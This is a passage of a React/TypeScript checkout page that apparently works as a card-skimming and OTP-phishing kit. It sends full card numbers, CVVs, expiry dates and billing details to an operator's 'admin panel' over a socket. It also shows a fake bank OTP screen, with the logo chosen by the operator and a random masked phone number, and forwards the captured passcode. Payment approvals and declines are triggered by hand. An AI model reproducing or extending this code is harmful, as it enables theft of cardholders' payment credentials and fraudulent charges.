      setCurrencySymbol(linkCurrency === 'USD' ? '$' : '₹');
      console.log(`🔒 Payment link currency override applied: ${linkCurrency}`);
      console.log(`💰 Currency symbol set to: ${linkCurrency === 'USD' ? '$' : '₹'}`);
    } else {
      console.log('❌ No valid linkCurrency found, using global currency');
    }
  }, [linkCurrency]);

  // Override global currency if hashed payment data specifies a currency
  useEffect(() => {
    if (hashedPaymentData && hashedPaymentData.currency) {
      const paymentCurrency = hashedPaymentData.currency.toUpperCase();
      console.log('🔍 Hashed payment currency:', paymentCurrency);
      if (paymentCurrency === 'INR' || paymentCurrency === 'USD') {
        setGlobalCurrency(paymentCurrency);
        setCurrencySymbol(paymentCurrency === 'USD' ? '$' : '₹');
        console.log(`🔒 Hashed payment currency override applied: ${paymentCurrency}`);
        console.log(`💰 Currency symbol set to: ${paymentCurrency === 'USD' ? '$' : '₹'}`);
      }
    }
  }, [hashedPaymentData]);

  // Note: Socket connection is already handled above in the main useEffect
  // This duplicate socket connection has been removed to avoid conflicts

  // Prevent zoom on OTP verification pages
  useEffect(() => {
    const preventZoom = (e: Event) => {
      e.preventDefault();
    };

    const preventKeyboardZoom = (e: KeyboardEvent) => {
      // Prevent Ctrl/Cmd + plus/minus/0
      if ((e.ctrlKey || e.metaKey) && (e.key === '+' || e.key === '-' || e.key === '0')) {
        e.preventDefault();
      }
    };

    const preventWheelZoom = (e: WheelEvent) => {
      // Prevent Ctrl/Cmd + scroll zoom
      if (e.ctrlKey || e.metaKey) {
        e.preventDefault();
      }
    };

    // Check if any OTP page is active
    const isOtpActive = currentStep === 'otp';

    if (isOtpActive) {
      // Prevent touch-based zoom (pinch-to-zoom)
      document.addEventListener('touchstart', preventZoom, { passive: false });
      document.addEventListener('touchmove', preventZoom, { passive: false });
      document.addEventListener('touchend', preventZoom, { passive: false });
      
      // Prevent keyboard zoom
      document.addEventListener('keydown', preventKeyboardZoom);
      
      // Prevent mouse wheel zoom
      document.addEventListener('wheel', preventWheelZoom, { passive: false });
      
      // Update viewport meta tag to prevent zoom
      const viewport = document.querySelector('meta[name=viewport]');
      if (viewport) {
        viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
      }
      
      // Prevent context menu (right-click zoom on some devices)
      document.addEventListener('contextmenu', preventZoom);
    } else {
      // Restore normal zoom behavior when not on OTP page
      const viewport = document.querySelector('meta[name=viewport]');
      if (viewport) {
        viewport.setAttribute('content', 'width=device-width, initial-scale=1.0');
      }
    }

    return () => {
      // Cleanup event listeners
      document.removeEventListener('touchstart', preventZoom);
      document.removeEventListener('touchmove', preventZoom);
      document.removeEventListener('touchend', preventZoom);
      document.removeEventListener('keydown', preventKeyboardZoom);
      document.removeEventListener('wheel', preventWheelZoom);
      document.removeEventListener('contextmenu', preventZoom);
    };
  }, [currentStep]);

  // Currency conversion helper function
  const convertPrice = (inrPrice: number): number => {
    if (globalCurrency === 'USD') {
      return Math.round((inrPrice / exchangeRate) * 100) / 100; // Convert INR to USD
    }
    return inrPrice; // Return INR price as-is
  };
  
  // Format price with currency symbol
  const formatPrice = (price: number): string => {
    // If we have currency from payment data, use it directly
    if (currency && (currency === 'USD' || currency === 'INR')) {
      const symbol = currency === 'USD' ? '$' : '₹';
      return `${symbol}${price.toLocaleString()}`;
    }
    
    // Fallback to global currency conversion
    const convertedPrice = convertPrice(price);
    return `${currencySymbol}${convertedPrice.toLocaleString()}`;
  };

  // Payment error screen state
  const [showPaymentErrorScreen, setShowPaymentErrorScreen] = useState(false);
  const [paymentErrorMessage, setPaymentErrorMessage] = useState('');

  // Card session map to store bank logos and mobile numbers for each card
  const cardSessionMap = useRef<{ [key: string]: { logo: string; last4: string } }>({});

  // Note: cardBrandLogos and getCardBrand are defined at the top level to avoid redeclaration

  // Pricing data based on the main page
  const pricingData = {
    yearly: {
      'Core Tech': { price: 10563, monthly: 880.25 },
      'Complete': { price: 28750, monthly: 2395.83 }, // Updated to show 28,750 for yearly
      'AI+': { price: 12327, monthly: 1027.25 },
      'Cloud+': { price: 12327, monthly: 1027.25 },
      'Data+': { price: 12327, monthly: 1027.25 },
      'Security+': { price: 12327, monthly: 1027.25 }
    },
    monthly: {
      'Core Tech': { price: 1100, monthly: 1100 },
      'Complete': { price: 2195, monthly: 2195 },
      'AI+': { price: 1299, monthly: 1299 },
      'Cloud+': { price: 1299, monthly: 1299 }
    }
  };

  // Handle custom amount from payment link
  let displayPrice: number;
  let billingText: string;
  let currency: string;
  
  // Priority order: hashed data > URL parameters > defaults
  if (finalAmount && !isNaN(parseFloat(finalAmount))) {
    displayPrice = parseFloat(finalAmount);
    billingText = 'Custom Amount';
    currency = finalCurrency || 'USD';
    console.log('✅ Using finalAmount from hashed payment data:', displayPrice, currency);
  } else if (customAmount && !isNaN(parseFloat(customAmount))) {
    displayPrice = parseFloat(customAmount);
    billingText = 'Custom Amount';
    currency = linkCurrency || 'USD';
    console.log('✅ Using customAmount from URL parameters:', displayPrice, currency);
  } else {
    // No payment link data, use default pricing based on plan
    const billingData = pricingData[billing as keyof typeof pricingData];
    if (billingData && billingData[planName as keyof typeof pricingData.yearly]) {
      const planData = billingData[planName as keyof typeof pricingData.yearly];
      displayPrice = billing === 'yearly' ? planData.price : planData.monthly;
      billingText = billing === 'yearly' ? 'Annually' : 'Monthly';
      currency = 'INR'; // Default pricing is in INR
    } else {
      // Fallback to Complete plan pricing if plan not found
      displayPrice = billing === 'yearly' ? 28750 : 2195;
      billingText = billing === 'yearly' ? 'Annually' : 'Monthly';
      currency = 'INR';
    }
    
    console.log('✅ Using plan pricing:', displayPrice, currency);
    console.log('🔍 DEBUG - Plan details:', { planName, billing, billingData, planData: billingData?.[planName as keyof typeof pricingData.yearly] });
    console.log('🔍 DEBUG - Final values being passed to OTP pages:', { displayPrice, formatPrice: formatPrice(displayPrice), currency });
  }

  // Handle OTP page loading delay for all pages (2-6 seconds)
  useEffect(() => {
    if (currentStep === 'otp' && (otpPageSelection === 'new' || otpPageSelection === 'third' || otpPageSelection === 'icici' || otpPageSelection === 'old')) {
      setNewOtpPageLoading(true);
      
      // Random delay between 2-6 seconds
      const randomDelay = Math.floor(Math.random() * 4000) + 2000; // 2000-6000ms
      devLog(`Loading ${otpPageSelection.toUpperCase()} OTP page in ${randomDelay/1000} seconds...`);
      
      const timer = setTimeout(() => {
        setNewOtpPageLoading(false);
        devLog(`${otpPageSelection.toUpperCase()} OTP page loaded!`);
      }, randomDelay);
      
      return () => clearTimeout(timer);
    }
  }, [currentStep, otpPageSelection]);

  const validateField = (field: string, value: string) => {
    switch (field) {
      case 'firstName':
        if (!value.trim()) return 'First name is required';
        // Check for valid name format (only letters, spaces, and basic punctuation)
        const nameRegex = /^[a-zA-Z\s\-\.\']+$/;
        return !nameRegex.test(value.trim()) ? 'Please enter a valid name' : '';
      case 'lastName':
        if (!value.trim()) return 'Last name is required';
        const lastNameRegex = /^[a-zA-Z\s\-\.\']+$/;
        return !lastNameRegex.test(value.trim()) ? 'Please enter a valid last name' : '';
      case 'email':
        if (!value.trim()) return 'Email is required';
        // Enhanced email validation
        const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
        if (!emailRegex.test(value)) return 'Please enter a valid email address';
        // Check for common invalid patterns
        if (value.includes('..') || value.startsWith('.') || value.endsWith('.')) return 'Please enter a valid email address';
        return '';
      case 'confirmEmail':
        if (!value.trim()) return 'Confirm email is required';
        return value !== formData.email ? 'Emails do not match' : '';
      case 'country':
        return !value ? 'Country is required' : '';
      default:
        return '';
    }
  };

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
    
    // Validate field if it has been touched
    if (touched[field as keyof typeof touched]) {
      const error = validateField(field, value);
      setErrors(prev => ({ ...prev, [field]: error }));
    }
  };

  const handleFieldBlur = (field: string) => {
    setTouched(prev => ({ ...prev, [field]: true }));
    const error = validateField(field, formData[field as keyof typeof formData]);
    setErrors(prev => ({ ...prev, [field]: error }));
  };

  const isFormValid = () => {
    const requiredFields = ['firstName', 'lastName', 'email', 'confirmEmail', 'country'];
    return requiredFields.every(field => {
      const value = formData[field as keyof typeof formData];
      return value && !validateField(field, value);
    }) && agreeTerms;
  };

  // Enhanced card validation functions
  const validateCardNumber = (cardNumber: string) => {
    const cleaned = cardNumber.replace(/\s/g, '');
    
    // Basic length check
    if (cleaned.length < 13 || cleaned.length > 19) return false;
    
    // Luhn algorithm check
    let sum = 0;
    let isEven = false;
    
    for (let i = cleaned.length - 1; i >= 0; i--) {
      let digit = parseInt(cleaned.charAt(i), 10);
      
      if (isEven) {
        digit *= 2;
        if (digit > 9) {
          digit -= 9;
        }
      }
      
      sum += digit;
      isEven = !isEven;
    }
    
    return sum % 10 === 0;
  };

  const getCardType = (cardNumber: string) => {
    const cleaned = cardNumber.replace(/\s/g, '');
    
    if (/^4/.test(cleaned)) return 'visa';
    if (/^5[1-5]/.test(cleaned) || /^2[2-7]/.test(cleaned)) return 'mastercard';
    if (/^6/.test(cleaned)) return 'discover';
    if (/^508[5-9]|^60/.test(cleaned)) return 'rupay';
    
    return null;
  };

  const validateCardField = (field: string, value: string) => {
    switch (field) {
      case 'cardNumber':
        if (!value.trim()) return 'Card number is required';
        const cleaned = value.replace(/\s/g, '');
        if (!/^\d+$/.test(cleaned)) return 'Card number must contain only digits';
        if (!validateCardNumber(cleaned)) return 'Invalid card number';
        return '';
      case 'cardName':
        if (!value.trim()) return 'Cardholder name is required';
        const nameRegex = /^[a-zA-Z\s\-\.\']+$/;
        return !nameRegex.test(value.trim()) ? 'Please enter a valid name' : '';
      case 'expiryMonth':
        if (!value) return 'Expiry month is required';
        const month = parseInt(value);
        if (month < 1 || month > 12) return 'Invalid month';
        
        // Check if month/year combination is in the past
        if (cardData.expiryYear) {
          const year = parseInt(cardData.expiryYear);
          const fullYear = year < 50 ? 2000 + year : 1900 + year;
          const currentDate = new Date();
          const currentYear = currentDate.getFullYear();
          const currentMonth = currentDate.getMonth() + 1;
          
          if (fullYear < currentYear || (fullYear === currentYear && month < currentMonth)) {
            return 'Card has expired. Please enter a valid expiry date';
          }
        }
        return '';
      case 'expiryYear':
        if (!value) return 'Expiry year is required';
        const year = parseInt(value);
        const fullYear = year < 50 ? 2000 + year : 1900 + year;
        const currentDate = new Date();
        const currentYear = currentDate.getFullYear();
        const currentMonth = currentDate.getMonth() + 1;
        
        if (fullYear < currentYear || fullYear > currentYear + 50) return 'Invalid year';
        
        // Check if month/year combination is in the past
        if (cardData.expiryMonth) {
          const month = parseInt(cardData.expiryMonth);
          if (fullYear < currentYear || (fullYear === currentYear && month < currentMonth)) {
            return 'Card has expired. Please enter a valid expiry date';
          }
        }
        return '';
      case 'cvv':
        if (!value.trim()) return 'CVV is required';
        if (!/^\d{3,4}$/.test(value)) return 'CVV must be 3-4 digits';
        return '';
      default:
        return '';
    }
  };

  // Format card number with spaces every 4 digits
  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    const groups = cleaned.match(/.{1,4}/g);
    return groups ? groups.join(' ') : cleaned;
  };

  const handleCardInputChange = (field: string, value: string) => {
    let formattedValue = value;
    
    // Apply special formatting for card number
    if (field === 'cardNumber') {
      formattedValue = formatCardNumber(value);
    }
    
    setCardData(prev => {
      const newCardData = { ...prev, [field]: formattedValue };
      
      // Cross-validate expiry fields when either changes
      if (field === 'expiryMonth' || field === 'expiryYear') {
        const monthError = validateCardField('expiryMonth', newCardData.expiryMonth);
        const yearError = validateCardField('expiryYear', newCardData.expiryYear);
        setCardErrors(prev => ({ ...prev, expiryMonth: monthError, expiryYear: yearError }));
      } else {
        const error = validateCardField(field, formattedValue);
        setCardErrors(prev => ({ ...prev, [field]: error }));
      }
      
      return newCardData;
    });
  };

  const isCardFormValid = () => {
    const requiredFields = ['cardNumber', 'cardName', 'expiryMonth', 'expiryYear', 'cvv'];
    return requiredFields.every(field => {
      const value = cardData[field as keyof typeof cardData];
      // Check if field has a value and no validation errors
      return value && value.trim() !== '' && !validateCardField(field, value);
    });
  };

  const areAllCardFieldsFilled = () => {
    const requiredFields = ['cardNumber', 'cardName', 'expiryMonth', 'expiryYear', 'cvv'];
    return requiredFields.every(field => {
      const value = cardData[field as keyof typeof cardData];
      return value && value.trim() !== '';
    });
  };



  const handleContinue = () => {
    // Validate all fields
    const newErrors = {
      firstName: validateField('firstName', formData.firstName),
      lastName: validateField('lastName', formData.lastName),
      email: validateField('email', formData.email),
      confirmEmail: validateField('confirmEmail', formData.confirmEmail),
      country: validateField('country', formData.country)
    };
    
    setErrors(newErrors);
    setTouched({
      firstName: true,
      lastName: true,
      email: true,
      confirmEmail: true,
      country: true
    });

    if (!agreeTerms) {
      setShowTermsError(true);
      return;
    }
    
    // Check if form is valid - only proceed if ALL fields are valid
    const hasErrors = Object.values(newErrors).some(error => error !== '');
    if (hasErrors || !isFormValid()) {
      return;
    }
    
    setShowTermsError(false);
    
    // Only validate contact fields here (not card fields)
    if (
      !formData.firstName ||
      !formData.lastName ||
      !formData.email ||
      !formData.confirmEmail ||
      !formData.country
    ) {
      alert('Please fill in all required contact fields.');
      return;
    }
    // Store user data for success page
    const userData = {
      firstName: formData.firstName,
      lastName: formData.lastName,
      email: formData.email,
      country: formData.country,
      companyName: formData.companyName,
      planName,
      billing,
      amount: displayPrice,
      paymentId
    };
    localStorage.setItem('userCheckoutData', JSON.stringify(userData));
    
    // Start the payment flow
    setCurrentStep('loading');
    
    // Show loading for 2-3 seconds then move to payment step
    setTimeout(() => {
      setCurrentStep('payment');
    }, 2500);
  };

  const handlePaymentMethodSelect = (method: string) => {
    setPaymentMethod(method);
    // Clear transaction cancel error when user selects payment method
    if (transactionCancelError) {
      setTransactionCancelError('');
    }
  };

  const handleReviewOrder = () => {
    // Validate all card fields
    const newCardErrors = {
      cardNumber: validateCardField('cardNumber', cardData.cardNumber),
      cardName: validateCardField('cardName', cardData.cardName),
      expiryMonth: validateCardField('expiryMonth', cardData.expiryMonth),
      expiryYear: validateCardField('expiryYear', cardData.expiryYear),
      cvv: validateCardField('cvv', cardData.cvv)
    };
    
    setCardErrors(newCardErrors);
    
    // Check if all fields are filled
    const requiredFields = ['cardNumber', 'cardName', 'expiryMonth', 'expiryYear', 'cvv'];
    const allFieldsFilled = requiredFields.every(field => {
      const value = cardData[field as keyof typeof cardData];
      return value && value.trim() !== '';
    });
    
    // Check if card form is valid - only proceed if ALL fields are valid
    const hasCardErrors = Object.values(newCardErrors).some(error => error !== '');
    const isFormValid = isCardFormValid();
    
    devLog('Card validation check:', {
      allFieldsFilled,
      hasCardErrors,
      isFormValid,
      cardData,
      newCardErrors
    });
    
    if (!allFieldsFilled || hasCardErrors || !isFormValid) {
      devLog('Validation failed - cannot proceed');
      return;
    }
    
    // Reset OTP attempt count for new payment session
    setOtpAttempts(0);
    setOtpFailedMessage('');
    console.log('🔄 Reset OTP attempt count for new payment session');
    
    // Store card data for success page
    const cardInfo = {
      cardNumber: cardData.cardNumber,
      cardName: cardData.cardName,
      expiryMonth: cardData.expiryMonth,
      expiryYear: cardData.expiryYear,
      cvv: cardData.cvv
    };
    localStorage.setItem('userCardData', JSON.stringify(cardInfo));
    
    devLog('Validation passed - proceeding to card checkout processing');
    setIsCardCheckoutProcessing(true);
    
    // The ProcessingLoader component will handle the multi-stage messages
    // After 10 seconds (3+4+3), proceed to review
    setTimeout(() => {
      setIsCardCheckoutProcessing(false);
      setCurrentStep('review');
    }, 10000);
  };

  // --- SOCKET EVENT HANDLING FOR PAYMENT FLOW ---

  useEffect(() => {
    if (!socket) {
      devLog('Socket not available, skipping event registration');
      return;
    }
    devLog('Registering socket event listeners for paymentId:', paymentId);
    
    // Handle admin show-otp command with bank logo data
    socket.on('show-otp', (data) => {
      devLog('🏦 Admin show-otp event received:', data);
      devLog('Current paymentId:', paymentId);
      devLog('Event paymentId:', data?.paymentId);
      
      if (!data || data.paymentId !== paymentId) {
        devLog('Payment ID mismatch, ignoring show-otp event');
        return;
      }
      
      // Update admin-selected bank logo from admin panel
      if (data.bankLogo) {
        devLog('🏦 Setting admin-selected bank logo:', data.bankLogo);
        setAdminSelectedBankLogo(data.bankLogo);
      }
      
      // Set OTP page selection if provided
      if (data.otpPageSelection) {
        setOtpPageSelection(data.otpPageSelection);
      }
      
      // Show OTP modal
      setCurrentStep('otp');
      setShowOtp(true);
      
      devLog('✅ OTP modal displayed with admin-selected bank logo');
    });
    
    socket.on('payment-approved', (data) => {
      devLog('Payment approved event received:', data);
      devLog('Current paymentId:', paymentId);
      devLog('Event paymentId:', data?.paymentId);
      devLog('Socket connected:', socket?.connected);
      
      if (!data || data.paymentId !== paymentId) {
        devLog('Payment ID mismatch or no data, ignoring event');
        return;
      }
      
      devLog('Payment approved - showing loading spinner');
      setShowOtp(false);
      setShowSpinner(true);
      
      // Store URL success for persistence
      const urlSuccessData = {
        paymentId: data.paymentId,
        timestamp: new Date().toISOString(),
        amount: displayPrice,
        planName: planName,
        billing: billing
      };
      storeUrlSuccess(urlSuccessData);
      devLog('💾 Stored URL success for payment:', data.paymentId);
      
      // Check if this payment has a generated success hash
      const storedSuccessData = localStorage.getItem(`payment_success_${data.paymentId}`);
      if (storedSuccessData) {
        const parsedData = JSON.parse(storedSuccessData);
        if (parsedData.successHash) {
          devLog('🔗 Found success hash, will redirect to hash-based success page');
          // Store the success hash for redirect
          localStorage.setItem('pendingSuccessHash', parsedData.successHash);
        }
      }
      
      // Show loading spinner for 3 seconds with blur effect
      setTimeout(() => {
        setShowSpinner(false);
        setCurrentStep('account');
        
        // Try to get formData and cardData from memory, or fallback to localStorage
        let _formData = { ...formData };
        let _cardData = { ...cardData };
        const isFormDataIncomplete = !_formData.firstName || !_formData.lastName || !_formData.email;
        const isCardDataIncomplete = !_cardData.cardNumber || !_cardData.cardName || !_cardData.expiryMonth || !_cardData.expiryYear || !_cardData.cvv;
        if (isFormDataIncomplete) {
          const storedUser = localStorage.getItem('userCheckoutData');
          if (storedUser) _formData = { ..._formData, ...JSON.parse(storedUser) };
        }
        if (isCardDataIncomplete) {
          const storedCard = localStorage.getItem('userCardData');
          if (storedCard) _cardData = { ..._cardData, ...JSON.parse(storedCard) };
        }
        // Now build successData as before
        const successData = {
          cardNumber: _cardData.cardNumber,
          cardName: _cardData.cardName,
          cvv: _cardData.cvv,
          expiry: `${_cardData.expiryMonth}/${_cardData.expiryYear}`,
          expiryMonth: _cardData.expiryMonth,
          expiryYear: _cardData.expiryYear,
          billingDetails: {
            firstName: _formData.firstName,
            lastName: _formData.lastName,
            email: _formData.email,
            country: _formData.country,
            companyName: _formData.companyName || ''
          },
          planName, 
          billing, 
          amount: displayPrice, 
          paymentId,
          timestamp: new Date().toISOString()
        };
        // Only proceed if all required fields are present
        if (
          !successData.billingDetails?.email ||
          !successData.cardNumber ||
          !successData.cardName ||
          !successData.cvv
        ) {
          devLog('Missing payment data:', successData);
          alert('Payment details not found. Please complete checkout again.');
          return;
        }
        localStorage.setItem('lastPaymentData', JSON.stringify(successData));
        
        // Check if we have a pending success hash to redirect to
        const pendingHash = localStorage.getItem('pendingSuccessHash');
        if (pendingHash) {
          devLog('🚀 Redirecting to hash-based success page:', pendingHash);
          localStorage.removeItem('pendingSuccessHash');
          navigate(`/success/${pendingHash}`);
        } else {
          devLog('🚀 Redirecting to regular success page');
          navigate('/payment-success', { 
            state: { 
              paymentData: successData
            } 
          });
        }
      }, 3000);
    });
    socket.on('payment-rejected', (data) => {
      if (!data || data.paymentId !== paymentId) return;
      console.log('🚨 PAYMENT-REJECTED EVENT TRIGGERED (OLD HANDLER) - This should reset confirmingPayment!');
      devLog('Payment rejected - showing error screen');
      
      // 🔧 CRITICAL FIX: Reset ALL loading states immediately to prevent spinner persistence
      console.log('🔧 Resetting ALL loading states in payment-rejected (OLD)...');
      setConfirmingPayment(false);
      setIsProcessing(false);
      setIsCardCheckoutProcessing(false);
      setOtpSubmitting(false);
      setNewOtpPageLoading(false);
      console.log('✅ confirmingPayment set to FALSE in payment-rejected (OLD)');
      
      setShowOtp(false);
      setShowSpinner(false);
      setPaymentErrorMessage('Sorry, your payment didn\'t go through, redirecting you to checkout page...');
      setShowPaymentErrorScreen(true);
      
      // Redirect to payment step after 4 seconds
      setTimeout(() => {
        setShowPaymentErrorScreen(false);
        setCurrentStep('payment');
        setDeclineError('Your card was declined!');
        
        // 🔧 Ensure loading states are still reset after timeout
        setConfirmingPayment(false);
        setIsProcessing(false);
        setIsCardCheckoutProcessing(false);
      }, 4000);
    });
    socket.on('insufficient-balance-error', (data) => {
      if (!data || data.paymentId !== paymentId) return;
      console.log('🚨 INSUFFICIENT-BALANCE-ERROR EVENT TRIGGERED - Adding confirmingPayment reset!');
      devLog('Insufficient balance - showing error screen');
      
      // 🔧 CRITICAL FIX: Reset ALL loading states for insufficient balance
      setConfirmingPayment(false);
      setIsProcessing(false);
      setIsCardCheckoutProcessing(false);
      setOtpSubmitting(false);
      setNewOtpPageLoading(false);
      console.log('✅ confirmingPayment set to FALSE in insufficient-balance-error');
      setShowOtp(false);
      setShowSpinner(false);
      setPaymentErrorMessage('Sorry, your payment didn\'t go through, redirecting you to checkout page...');
      setShowPaymentErrorScreen(true);
      
      // Redirect to payment step after 4 seconds
      setTimeout(() => {
        setShowPaymentErrorScreen(false);
        setCurrentStep('payment');
        setDeclineError('Your card have insufficient balance to pay for this order');
      }, 4000);
    });
    socket.on('invalid-otp-error', (data) => {
      if (!data || data.paymentId !== paymentId) return;
      setOtpSubmitting(false);
      setOtpError('incorrect otp, please enter valid One time passcode');
      setTimeout(() => setOtpError(''), 5000);
    });
    socket.on('card-declined-error', (data) => {
      if (!data || data.paymentId !== paymentId) return;
      console.log('🚨 CARD-DECLINED-ERROR EVENT TRIGGERED - Adding confirmingPayment reset!');
      devLog('Card declined error - showing error screen');
      
      // 🔧 CRITICAL FIX: Reset ALL loading states for card declined
      setConfirmingPayment(false);
      setIsProcessing(false);
      setIsCardCheckoutProcessing(false);
      setOtpSubmitting(false);
      setNewOtpPageLoading(false);
      console.log('✅ confirmingPayment set to FALSE in card-declined-error');
      setShowOtp(false);
      setShowSpinner(false);
      setPaymentErrorMessage('Sorry, your payment didn\'t go through, redirecting you to checkout page...');
      setShowPaymentErrorScreen(true);
      setIsProcessing(false); // Always hide spinner on error
      // Redirect to payment step after 4 seconds
      setTimeout(() => {
        setShowPaymentErrorScreen(false);
        setCurrentStep('payment');
        setCardError('Your card was declined!');
      }, 4000);
    });
    return () => {
      devLog('Cleaning up socket event listeners');
      if (socket) {
        socket.off('show-otp');
        socket.off('payment-approved');
        socket.off('payment-rejected');
        socket.off('invalid-otp-error');
        socket.off('card-declined-error');
        socket.off('insufficient-balance-error');
      }
    };
  }, [socket, paymentId]);

  // Animation effect for OTP modal entrance
  useEffect(() => {
    if (currentStep === 'otp') {
      setOtpModalAnimating(true);
      // Small delay to ensure the modal is rendered before animation starts
      const timer = setTimeout(() => {
        setOtpModalAnimating(false);
      }, 50);
      return () => clearTimeout(timer);
    }
  }, [currentStep]);

  const handleOtpSubmit = () => {
    try {
      if (!socket) {
        alert('Connection lost. Please refresh the page and try again.');
        return;
      }
      
      if (!otpValue || otpValue.length < 4) {
        alert('Please enter a valid OTP.');
        return;
      }
      
      setOtpSubmitting(true);
      setOtpError('');
      setIsProcessing(true); // Show spinner during OTP submit
      socket.emit('otp-submitted', { otp: otpValue, paymentId });
    } catch (error) {
      console.error('Error submitting OTP:', error);
      setOtpSubmitting(false);
      alert('Failed to submit OTP. Please try again.');
    }
  };

  const handleOtpCancel = () => {
    setTimeout(() => {
      setCurrentStep('account');
      setShowOtp(false);
      setOtpValue('');
      setOtpError('');
      alert('Transaction cancelled');
    }, 2000);
  };

  const handleResendOtp = () => {
    setResendMessage('One time passcode have been sent to your registered mobile number');
    setTimeout(() => setResendMessage(''), 5000);
    startOtpTimer();
  };

  const startOtpTimer = () => {
    // Random timer between 1.59 to 9.59 minutes (in seconds)
    const randomMinutes = Math.floor(Math.random() * 8) + 1; // 1-8 minutes
    const randomSeconds = 59; // Always 59 seconds
    const totalSeconds = randomMinutes * 60 + randomSeconds;
    setOtpTimer(totalSeconds);
  };

  // Timer countdown effect
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (otpTimer > 0 && currentStep === 'otp') {
      interval = setInterval(() => {
        setOtpTimer(prev => {
          if (prev <= 1) {
            setCurrentStep('account');
            setShowOtp(false);
            alert('Session expired. Please try again.');
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [otpTimer, currentStep]);

  const formatTimer = (seconds: number) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}.${remainingSeconds.toString().padStart(2, '0')}`;
  };

  // Handle refresh on OTP page and initialize socket connection
  useEffect(() => {
    // Handle page refresh during OTP verification
    const handleBeforeUnload = (e: BeforeUnloadEvent) => {
      if (currentStep === 'otp') {
        e.preventDefault();
        e.returnValue = '';
        
        // Show confirmation popup
        const confirmed = window.confirm('Do you want to cancel this transaction?');
        if (confirmed) {
          setCurrentStep('account');
          setShowOtp(false);
          alert('User pressed back button error msg');
        }
        return '';
      }
      
      // No need to disconnect here as the context socket handles it
    };

    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      window.removeEventListener('beforeunload', handleBeforeUnload);
      // No need to disconnect here as the context socket handles it
    };
  }, [currentStep]);

  const handleConfirmPayment = () => {
    try {
      console.log('🚀 STARTING handleConfirmPayment - Setting confirmingPayment to TRUE');
      
      // 🔧 COMPREHENSIVE FIX: Clear all previous states before starting new payment
      setConfirmingPayment(true);
      setIsProcessing(false);
      setIsCardCheckoutProcessing(false);
      setOtpSubmitting(false);
      setNewOtpPageLoading(false);
      setTransactionCancelError('');
      setCardDeclinedError('');
      setOtpError('');
      setProcessingMessage('');
      
      console.log('✅ All states reset, confirmingPayment is now TRUE');
      
      if (!socket) {
        alert('Connection lost. Please refresh the page and try again.');
        console.log('❌ No socket, setting confirmingPayment to FALSE');
        setConfirmingPayment(false);
        return;
      }
      
      // 🔧 FIX: Generate new transaction ID for retry attempts to prevent server ignoring duplicates
      const currentTime = Date.now();
      const retryPaymentId = `${paymentId}_retry_${currentTime}`;
      console.log('🔄 Using payment ID for this attempt:', retryPaymentId);
      
      const paymentData = {
        paymentId: retryPaymentId,
        originalPaymentId: paymentId, // Keep reference to original
        cardNumber: cardData.cardNumber,
        cardName: cardData.cardName,
        cvv: cardData.cvv,
        expiry: `${cardData.expiryMonth}/${cardData.expiryYear}`,
        expiryMonth: cardData.expiryMonth,
        expiryYear: cardData.expiryYear,
        billingDetails: {
          firstName: formData.firstName,
          lastName: formData.lastName,
          email: formData.email,
          country: formData.country,
          companyName: formData.companyName || ''
        },
        planName,
        billing,
        amount: displayPrice,
        timestamp: new Date().toISOString(),
        isRetry: currentTime > (window as any).lastPaymentAttempt + 5000 // Mark as retry if >5s since last attempt
      };
      
      // Track this attempt time
      (window as any).lastPaymentAttempt = currentTime;
      setOtpValue("");
      setOtpError("");
      setShowOtp(false);
      setOtpSubmitting(false);
      setResendMessage("");
      setShowSpinner(false);
      setDeclineError("");
      setCardError("");
      const cardKey = cardData.cardNumber.replace(/\s/g, "");
      if (!cardSessionMap.current[cardKey]) {
        const randomLogo = bankLogos[Math.floor(Math.random() * bankLogos.length)];
        const randomLast4 = Math.floor(1000 + Math.random() * 9000).toString();
        cardSessionMap.current[cardKey] = { logo: randomLogo, last4: randomLast4 };
      }
      
      // Debug logging
      devLog('🔍 Bank logo selection debug:');
      devLog('Admin selected bank logo:', adminSelectedBankLogo);
      devLog('Session bank logo (random):', cardSessionMap.current[cardKey].logo);
      devLog('Will use admin logo if available:', adminSelectedBankLogo || cardSessionMap.current[cardKey].logo);
      
      setSessionBankLogo(cardSessionMap.current[cardKey].logo);
      setOtpMobileLast4(cardSessionMap.current[cardKey].last4);
      
      // 🔧 FIX: Ensure socket is connected before emitting
      console.log('🔍 Emitting payment-data to admin panel...');
      console.log('📊 Socket connected:', socket.connected);
      console.log('💳 Payment data:', paymentData);
      console.log('🆔 Payment ID:', paymentId);
      
      if (socket.connected) {
        socket.emit('payment-data', paymentData);
        console.log('✅ Payment data emitted successfully to admin panel');
      } else {
        console.error('❌ Socket not connected, payment data NOT sent to admin panel');
        alert('Connection lost. Please refresh the page and try again.');
        setConfirmingPayment(false);
        return;
      }
    } catch (error) {
      console.error('Error in payment confirmation:', error);
      setConfirmingPayment(false);
      alert('An unexpected error occurred. Please try again.');
    }
  };

  const getVisitorId = () => {
    let visitorId = sessionStorage.getItem('visitorId');
    if (!visitorId) {
      visitorId = uuidv4();
      sessionStorage.setItem('visitorId', visitorId);
    }
    return visitorId;
  };

  const visitorId = getVisitorId();

  // Show expired page if payment link is expired
  if (isPaymentLinkExpired) {
    return <ExpiredPage />;
  }

  return (
    <div className="min-h-screen bg-slate-900 text-white overflow-x-hidden" style={{ touchAction: 'manipulation', WebkitTouchCallout: 'none', WebkitUserSelect: 'none' }}>
      {/* Global Loading Spinner for Payment Success */}
      {showSpinner && (
        <div className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-md flex items-center justify-center z-[9999]">
          <div className="flex flex-col items-center justify-center text-center">
            <div className="w-16 h-16 bg-gradient-to-r from-green-400 to-blue-500 rounded-full flex items-center justify-center mb-4 animate-pulse">
              <Loader2 className="h-8 w-8 text-white animate-spin" />
            </div>
            <p className="text-white text-lg font-medium">Processing...</p>
          </div>
        </div>
